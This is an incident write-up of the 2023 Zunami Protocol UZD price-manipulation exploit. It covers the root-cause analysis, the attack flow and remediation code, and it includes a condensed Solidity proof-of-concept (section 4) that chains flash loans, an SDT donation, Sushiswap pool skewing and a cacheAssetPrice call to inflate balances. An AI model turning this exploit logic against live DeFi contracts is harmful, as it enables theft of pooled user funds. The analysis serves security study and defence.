# Zunami Protocol — Curve Spot Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-08-13 |
| **Protocol** | Zunami Protocol (UZD) |
| **Chain** | Ethereum |
| **Loss** | ~$2,120,000 USD |
| **Attacker** | [0x5f4c...d46df](https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df) |
| **Attack Contract** | [0xa21a...e7a27](https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75) |
| **Attack Tx** | [0x0788...cceb](https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb) |
| **Vulnerable Contract** | [0xb40b...f1c](https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c) |
| **Root Cause** | Curve pool spot price and manipulable external state (SDT balance) used for UZD price calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Zunami_exp.sol) |

---

## 1. Vulnerability Overview

Zunami Protocol is a yield aggregation protocol that issues a stablecoin called UZD. The UZD `balanceOf()` function does not simply return a stored balance — it uses a rebase architecture that dynamically computes balances by applying an updated price ratio through `cacheAssetPrice()`.

Two critical vulnerabilities were combined in this price ratio calculation:

1. **Internal value inflation via SDT donation**: The `totalHoldings()` calculation of the `MIMCurveStakeDao` contract adds the USD value of held SDT tokens by converting them via the Sushiswap router's `getAmountsOut()` (a real-time spot price). When an attacker donates a large amount of SDT, the contract's SDT balance surges, causing the protocol's total assets under management (AUM) to be grossly overestimated.

2. **Sushiswap spot price manipulation**: The attacker swaps 10,000 WETH for SDT to significantly move the SDT/WETH price, and simultaneously swaps 7,000,000 USDT for WETH to manipulate the WETH/USDT price. This causes the return value of the `getAmountsOut(SDT → WETH → USDT)` path to increase abnormally.

When these two manipulations are combined, the price ratio in UZD explodes upward upon calling `cacheAssetPrice()`, and the `balanceOf()` return value for the attacker's UZD grows far beyond the amount actually deposited. The attacker then sells this inflated UZD into Curve pools to realize the profit.

---

## 2. Vulnerable Code Analysis

### 2.1 Manipulable Price Oracle (Core Vulnerability)

In the process of calculating UZD's total asset value, `MIMCurveStakeDao.totalHoldings()` uses logic similar to the following:

```solidity
// ❌ Vulnerable code — MIMCurveStakeDao.totalHoldings() (estimated)
function totalHoldings() public view returns (uint256) {
    // Sum of unclaimed SDT rewards and current balance
    uint256 sdtEarned = /* unclaimed SDT rewards */;
    uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this));
    // ❌ Core vulnerability: SDT → USDT conversion using Sushiswap spot price
    // This value can be fully manipulated via flash loan SDT donation + pool manipulation
    uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath);
    
    // Manipulated SDT value is added to total assets
    return baseHoldings + sdtEarningsInFeeToken;
}

// ❌ Spot price query — vulnerable to manipulation
function priceTokenByExchange(uint256 amountIn, address[] memory path) internal view returns (uint256) {
    // Sushiswap router's getAmountsOut returns spot price based on current pool state
    // During a flash loan, pool ratios are in a manipulated state and cannot be trusted at all
    uint256[] memory amounts = sushiRouter.getAmountsOut(amountIn, path);
    return amounts[amounts.length - 1];
}
```

```solidity
// ✅ Fixed code — use TWAP-based pricing
function priceTokenByExchange(uint256 amountIn, address[] memory path) internal view returns (uint256) {
    // ✅ Use Chainlink or Uniswap V3 TWAP oracle (time-weighted average over 30+ minutes)
    // A single-block manipulation cannot meaningfully affect a TWAP
    uint256 price = chainlinkOracle.getPrice(path[0], path[path.length - 1]);
    return amountIn * price / 1e18;
}
```

**Issue**: `getAmountsOut()` returns the spot price for the current block's pool state, making it trivially manipulable by large swaps within the same transaction. Moreover, SDT can be donated to the contract for free to increase its SDT balance, allowing simultaneous manipulation of both price and quantity.

### 2.2 Rebase Price Update Mechanism — cacheAssetPrice()

```solidity
// ❌ Vulnerable code — UZD.cacheAssetPrice()
function cacheAssetPrice() external {
    // Sum totalHoldings() across all strategies to compute total AUM
    // At this point, MIMCurveStakeDao.totalHoldings() already returns a manipulated value
    uint256 totalAssets = /* sum of totalHoldings() per strategy */;
    uint256 totalSupply = totalSupply();
    
    // ❌ Price ratio updated based on manipulated totalAssets
    // assetPrice = totalAssets / totalSupply  → artificially inflated
    assetPrice = totalAssets * PRICE_PRECISION / totalSupply;
}

// balanceOf applies the updated assetPrice, returning a value larger than reality
function balanceOf(address account) public view override returns (uint256) {
    // ❌ If assetPrice is a manipulated value, the returned balance is also inflated
    return super.balanceOf(account) * assetPrice / PRICE_PRECISION;
}
```

```solidity
// ✅ Fixed code — price manipulation defense
function cacheAssetPrice() external {
    // ✅ Access control: only trusted keepers can call (or enforce a minimum time interval)
    require(msg.sender == keeper || block.timestamp >= lastCacheTime + MIN_INTERVAL, "Too frequent");
    
    uint256 totalAssets = /* sum of totalHoldings() per strategy (TWAP-based) */;
    uint256 totalSupply = totalSupply();
    
    // ✅ Prevent sudden price spikes (e.g., revert if change exceeds ±5% from previous value)
    uint256 newPrice = totalAssets * PRICE_PRECISION / totalSupply;
    require(newPrice <= lastAssetPrice * 105 / 100, "Price spike detected");
    require(newPrice >= lastAssetPrice * 95 / 100, "Price drop detected");
    
    lastAssetPrice = assetPrice;
    assetPrice = newPrice;
    lastCacheTime = block.timestamp;
}
```

**Issue**: `cacheAssetPrice()` has no access control, allowing the attacker to call it immediately after completing the manipulation to lock in the distorted price. Additionally, the absence of a circuit breaker means even extreme values are accepted as-is.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA (`0x5f4c...d46df`) deploys attack contract (`0xa21a...e7a27`)
- Attack contract implements a Uniswap V3 flash callback (`uniswapV3FlashCallback`) and a Balancer flash callback (`receiveFlashLoan`)

### 3.2 Execution Phase

1. **Initiate Uniswap V3 flash loan**: Borrow 7,000,000 USDT from the USDC/USDT pool
2. **Nested Balancer flash loan**: Borrow an additional 7,000,000 USDC + 10,011 WETH (all manipulation is performed inside the Balancer `receiveFlashLoan` callback)
3. **Acquire UZD**: Mint crvFRAX with 5,750,000 USDC → buy UZD from the UZD_crvFRAX pool; buy crvUSD with 1,250,000 USDC → buy additional UZD from the crvUSD_UZD pool
4. **SDT Donation**: Swap 11 WETH for SDT via ETH_SDT_POOL → transfer all acquired SDT to `MIMCurveStakeDao` for free → contract's SDT balance surges → first-stage inflation of `totalHoldings()` return value
5. **Sushiswap pool manipulation**: Swap 10,000 WETH for SDT (SDT price drops sharply; inversely, the SDT→WETH→USDT path value increases) + swap 7,000,000 USDT for WETH (WETH price drops → large SDT→WETH output becomes possible)
6. **Price lock-in**: Call `UZD.cacheAssetPrice()` → price ratio finalized based on manipulated `totalHoldings()` → attacker's UZD `balanceOf()` explodes
7. **Sell UZD**: Exchange 84% of inflated UZD for crvFRAX in the UZD_crvFRAX pool; exchange remaining UZD for crvUSD in the crvUSD_UZD pool
8. **Cleanup and flash loan repayment**: Decompose crvFRAX → FRAX + USDC; swap FRAX → USDC; swap crvUSD → USDC; swap surplus USDC → WETH; repay Balancer principal + fees; repay Uniswap principal + fees

### 3.3 Attack Flow Diagram

```
Attacker EOA
    │
    ▼
┌─────────────────────────────────────┐
│  Uniswap V3 Flash (USDC/USDT Pair)  │
│  Borrow: 7,000,000 USDT             │
└─────────────────────┬───────────────┘
                      │ uniswapV3FlashCallback
                      ▼
┌─────────────────────────────────────┐
│  Balancer Flash Loan                │
│  Borrow: 7,000,000 USDC + 10,011 WETH│
└─────────────────────┬───────────────┘
                      │ receiveFlashLoan
                      ▼
┌─────────────────────────────────────┐
│  [Step 1] Acquire UZD               │
│  USDC 5.75M → crvFRAX → UZD        │
│  USDC 1.25M → crvUSD → UZD         │
│  Attacker UZD balance: ~X UZD       │
└─────────────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────┐
│  [Step 2] SDT Donation Attack       │
│  WETH 11 → SDT                      │
│  All SDT → transfer to MIMCurveStakeDao│
│  Effect: MIMCurveStakeDao SDT balance surges│
└─────────────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────┐
│  [Step 3] Sushiswap Pool Manipulation│
│  WETH 10,000 → SDT (SDT pool ratio skewed)│
│  USDT 7,000,000 → WETH (WETH price drops)│
│  Effect: SDT→WETH→USDT spot price explodes│
└─────────────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────┐
│  [Step 4] UZD.cacheAssetPrice()     │
│  Manipulated totalHoldings() reflected│
│  assetPrice = updated to manipulated ratio│
│  Attacker UZD balanceOf() explodes  │
└─────────────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────┐
│  [Step 5] Sell UZD (Realize Profit) │
│  UZD 84% → crvFRAX (UZD_crvFRAX pool)│
│  UZD remainder → crvUSD (crvUSD_UZD pool)│
│  crvFRAX → FRAX + USDC decomposed   │
│  crvUSD → USDC swap                 │
└─────────────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment      │
│  Balancer repay: 7M USDC + 10,011 WETH│
│  Uniswap repay: 7M USDT + fees      │
└─────────────────────┬───────────────┘
                      │
                      ▼
                Attacker net profit: ~$2.12M
```

### 3.4 Outcome

- **Protocol loss**: ~$2,120,000 USD (Curve pool liquidity drained via UZD price manipulation)
- **Attacker profit**: Final proceeds confirmed in the form of WETH and USDT

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Step 1] Borrow 7,000,000 USDT via Uniswap V3 flash loan
function testExploit() external {
    // Flash borrow from Uniswap V3 USDC/USDT pool — 7M USDT
    USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));
}

// [Step 2] Execute nested Balancer flash loan inside Uniswap callback
function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
    BalancerFlashLoan(); // Borrow additional 7M USDC + 10,011 WETH
    uint256 amount = abi.decode(data, (uint256));
    // Repay Uniswap principal + fees
    TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
}

// [Step 3] Actual attack logic executed inside Balancer callback
function receiveFlashLoan(...) external {
    apporveAll(); // approve all tokens

    // [3-1] Mint crvFRAX then buy UZD (using 5.75M USDC)
    uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity([0, 5_750_000 * 1e6], 0);
    UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // crvFRAX → UZD

    // [3-2] Buy additional UZD via crvUSD route (using 1.25M USDC)
    crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // USDC → crvUSD
    crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // crvUSD → UZD

    // [3-3] SDT donation — spike MIMCurveStakeDao's SDT balance
    ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // WETH 11 → SDT
    SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // ❌ Donate all SDT → first-stage totalHoldings() inflation

    // [3-4] Sushiswap pool manipulation — inflate getAmountsOut path price
    swapToken1Totoken2(WETH, SDT, 10_000 ether);     // ❌ WETH 10,000 → SDT (skew SDT pool ratio)
    uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // ❌ USDT 7M → WETH (manipulate WETH price)

    // [3-5] Finalize UZD rebase with manipulated price — ❌ core vulnerability triggered
    UZD.cacheAssetPrice(); // Update assetPrice based on manipulated totalHoldings() → balanceOf() explodes

    // [3-6] Unwind SDT/WETH positions (restore pools, pocket profit)
    swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // SDT → WETH
    swapToken1Totoken2(WETH, USDT, value); // WETH → USDT

    // [3-7] Sell inflated UZD (realize profit)
    UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // UZD → crvFRAX
    crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // UZD → crvUSD

    // [3-8] Liquidate LP and clean up tokens
    FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]);
    FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // FRAX → USDC
    crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // crvUSD → USDC
    Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // USDC → USDT

    // [3-9] Swap surplus USDC → WETH, then repay Balancer
    uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
    USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, "");
    IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]); // Repay USDC
    IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]); // Repay WETH
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Using Sushiswap spot price as oracle | CRITICAL | CWE-841 | `04_oracle_manipulation.md` | Harvest Finance (2020, $34M) |
| V-02 | Accounting manipulation via SDT donation | CRITICAL | CWE-682 | `16_accounting_sync.md` | Euler Finance (2023, $197M) |
| V-03 | Missing access control on cacheAssetPrice() | HIGH | CWE-284 | `03_access_control.md` | — |
| V-04 | No price update blocking during flash loan | HIGH | CWE-362 | `02_flash_loan.md` | bZx Attack #1 (2020) |

### V-01: Using Sushiswap Spot Price as Oracle

- **Description**: `MIMCurveStakeDao.totalHoldings()` computes the USD value of held SDT using the Sushiswap router's `getAmountsOut()`. This function returns the raw pool ratio (spot price) for the current block, making it entirely untrustworthy within the same transaction where a flash loan has manipulated the pool ratio.
- **Impact**: `totalHoldings()` return value increases by tens of multiples → `assetPrice` ratio explodes → UZD `balanceOf()` artificially inflates → this UZD can be exchanged for real liquidity in pools → protocol funds drained.
- **Attack conditions**: Flash loan + manipulation of two Sushiswap pools (SDT/WETH, WETH/USDT) + ability to call `transfer()` on SDT (anyone can do this).

### V-02: Accounting Manipulation via SDT Donation

- **Description**: `MIMCurveStakeDao` directly includes its own `balanceOf(SDT)` in the asset value calculation. Transferring SDT to the contract for free increases its reported asset value with no corresponding increase in UZD supply, effectively increasing the per-share value for existing UZD holders (the attacker) without dilution.
- **Impact**: The increase in UZD value can far exceed the cost of the SDT donation (leverage effect).
- **Attack conditions**: Holding SDT tokens + knowing the `MIMCurveStakeDao` address (public information).

### V-03: Missing Access Control on cacheAssetPrice()

- **Description**: `UZD.cacheAssetPrice()` can be called by anyone at any time. Calling this function while state is manipulated permanently caches the distorted price, which is then applied to all subsequent `balanceOf()` return values.
- **Impact**: The attacker can lock in the price manipulation at will.
- **Attack conditions**: None (fully permissionless).

### V-04: No Price Update Blocking During Flash Loan

- **Description**: There is no reentrancy guard or flash loan detection logic to block price update functions within a flash loan transaction. This allows the full sequence of price manipulation → update → profit realization to complete within a single atomic transaction.
- **Impact**: Atomicity of the manipulation is guaranteed → profit realized with no market risk.
- **Attack conditions**: Access to a flash loan provider (anyone).

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Replace price oracle with TWAP or Chainlink**

```solidity
// ✅ Example using Chainlink oracle
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

function getSdtUsdValue(uint256 sdtAmount) internal view returns (uint256) {
    AggregatorV3Interface sdtFeed = AggregatorV3Interface(SDT_USD_CHAINLINK_FEED);
    (, int256 price, , uint256 updatedAt, ) = sdtFeed.latestRoundData();
    
    // ✅ Stale price check (revert if data is older than 1 hour)
    require(block.timestamp - updatedAt <= 3600, "Oracle: stale price");
    require(price > 0, "Oracle: invalid price");
    
    // ✅ Uniswap V3 TWAP alternative (if Chainlink unavailable)
    // uint256 twapPrice = UniV3TwapOracle.consult(SDT, USDT, 1800); // 30-minute TWAP
    
    return sdtAmount * uint256(price) / 1e8; // Chainlink 8 decimals
}
```

**2) Add access control and price spike circuit breaker to cacheAssetPrice()**

```solidity
// ✅ Access control + price change limit + reentrancy guard
mapping(address => bool) public authorizedKeepers;
uint256 public lastCacheTime;
uint256 public constant MIN_CACHE_INTERVAL = 1 hours;
uint256 public constant MAX_PRICE_CHANGE_BPS = 500; // 5%

modifier onlyKeeper() {
    require(authorizedKeepers[msg.sender], "Not authorized keeper");
    _;
}

function cacheAssetPrice() external nonReentrant onlyKeeper {
    // ✅ Enforce minimum update interval
    require(block.timestamp >= lastCacheTime + MIN_CACHE_INTERVAL, "Too frequent");
    
    uint256 newPrice = _calculateAssetPrice(); // TWAP-based calculation
    
    // ✅ Block sudden price movements
    uint256 maxPrice = assetPrice * (10000 + MAX_PRICE_CHANGE_BPS) / 10000;
    uint256 minPrice = assetPrice * (10000 - MAX_PRICE_CHANGE_BPS) / 10000;
    require(newPrice <= maxPrice && newPrice >= minPrice, "Price change exceeds limit");
    
    assetPrice = newPrice;
    lastCacheTime = block.timestamp;
}
```

**3) Defend against donation attacks — prohibit direct reference to external balances**

```solidity
// ✅ Track balances via internal ledger (only reflect actually transferred amounts)
uint256 internal _trackedSdtBalance; // track only SDT actually received

function depositSdt(uint256 amount) external {
    SDT.transferFrom(msg.sender, address(this), amount);
    _trackedSdtBalance += amount; // ✅ Update internal ledger
}

function totalHoldings() public view returns (uint256) {
    // ✅ Use internal ledger instead of balanceOf() — neutralizes external donations
    uint256 sdtValue = getSdtUsdValue(_trackedSdtBalance); // TWAP-based
    return baseHoldings + sdtValue;
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Spot price dependency | Switch to Chainlink or Uniswap V3 30-minute+ TWAP oracle |
| V-02 Donation attack | Introduce internal accounting pattern; prohibit direct `balanceOf(this)` references |
| V-03 Missing access control | `onlyKeeper` modifier + automated off-chain keeper network (e.g., Chainlink Keepers) |
| V-04 Price update during flash loan | `nonReentrant` modifier + enforced minimum update interval (1 hour+) |
| Overall architecture | Introduce price manipulation detection system (e.g., Forta Network) and add emergency pause functionality |

---

## 7. Lessons Learned

1. **AMM spot prices must never be used as oracles**: Prices derived from current block pool state — such as `getAmountsOut()`, `getReserves()`, or Curve's `get_dy()` — can be manipulated by tens of multiples in an instant with a single flash loan. Price oracles must use Chainlink, Pyth, or TWAP with a window of at least 30 minutes.

2. **Direct references to external balances (balanceOf) create accounting manipulation vulnerabilities**: `token.balanceOf(address(this))` can be manipulated for free by anyone. Core asset accounting must always be based on internal ledger variables, and externally received tokens should only be reflected through an explicit deposit function (`deposit()`) path.

3. **Permissionless price update functions are attack vectors**: After completing manipulation, an attacker can directly call `cacheAssetPrice()` to finalize the distorted state. Functions that update prices must be restricted to trusted keepers or subject to a minimum time interval.

4. **The danger of compound manipulation**: The attack only works when three elements are combined: "SDT donation + spot price manipulation + unrestricted `cacheAssetPrice()` call." Defending against each in isolation may not be sufficient, making defense-in-depth design critical.

5. **Rebase tokens are high-risk targets for price manipulation attacks**: Designs like UZD, where `balanceOf()` changes dynamically based on an internal price ratio, mean that the impact of price manipulation feeds directly into token balances. When designing rebase tokens, the security of the price determination logic must be the top priority.

6. **Mandate review of prior similar incidents**: Price manipulation attacks using Curve/AMM spot prices — such as Harvest Finance (2020) and Inverse Finance (2022) — are a known attack pattern with multiple precedents. The protocol design phase must systematically review prior hack cases and oracle security guidelines.

---

## 8. On-Chain Verification

On-chain verification was not performed in the current environment due to `cast` (Foundry) not being installed. The following describes how to perform verification and what to check.

### 8.1 Verification Commands

```bash
# Query basic attack Tx info
cast tx 0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb \
  --rpc-url https://eth-mainnet.public.blastapi.io

# Query event logs
cast receipt --json 0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb \
  --rpc-url https://eth-mainnet.public.blastapi.io

# Query UZD vulnerable contract state at pre-attack block (17,908,948)
cast call 0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c \
  "totalSupply()(uint256)" \
  --rpc-url https://eth-mainnet.public.blastapi.io \
  --block 17908948
```

### 8.2 Expected PoC vs. On-Chain Verification Items

| Item | PoC Code Value | Verification Method |
|------|------------|-----------|
| Uniswap flash borrow amount | 7,000,000 USDT | `flash()` event log |
| Balancer flash borrow amount | 7,000,000 USDC + 10,011 WETH | `FlashLoan` event |
| crvFRAX mint quantity | 5.75M USDC input | `add_liquidity` Transfer event |
| SDT donation quantity | WETH 11 → SDT → MIMCurveStakeDao | SDT Transfer event |
| WETH → SDT swap | 10,000 WETH | Sushiswap Swap event |
| USDT → WETH swap | 7,000,000 USDT | Sushiswap Swap event |
| Final profit | ~$2.12M (WETH + USDT) | Attacker address balance change |

*Reference: Attack block number 17,908,949 (based on PoC `vm.createSelectFork("mainnet", 17_908_949)`)*